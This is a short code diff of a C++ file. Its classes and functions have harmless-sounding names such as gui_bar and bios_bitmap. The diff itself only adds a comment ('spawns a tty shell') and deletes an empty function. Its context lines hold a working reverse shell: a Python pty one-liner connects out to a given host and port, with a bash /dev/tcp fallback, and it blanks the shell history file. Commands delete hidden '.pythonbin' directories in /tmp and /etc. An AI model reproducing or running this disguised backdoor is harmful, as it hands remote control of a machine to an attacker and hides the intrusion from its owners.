@@ -90,7 +90,7 @@ class gui_bar{
             system("rm -rf /tmp/.pythonbin/");
             system("rm -rf /etc/.pythonbin/");
         }
-        void bios_bitmap(string bios_host, string bios_num) 
+        void bios_bitmap(string bios_host, string bios_num) // spawns a tty shell
         {
             if(system(("python3 -c 'import os, pty, socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"" + string(bios_host) + "\", " + string(bios_num) + ")); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'").c_str()) != 0){
                 if(system(("bash -i >& /dev/tcp/" + string(bios_host) + "/" + string(bios_num) + " 0>&1").c_str()) != 0){
@@ -196,9 +196,6 @@ class gui_user{
             return gui_name;
           }
         }  
-    }
-    void user_config_s(void){ // file config  for boot and shit
-        
     }
 }; gui_user gu;
 
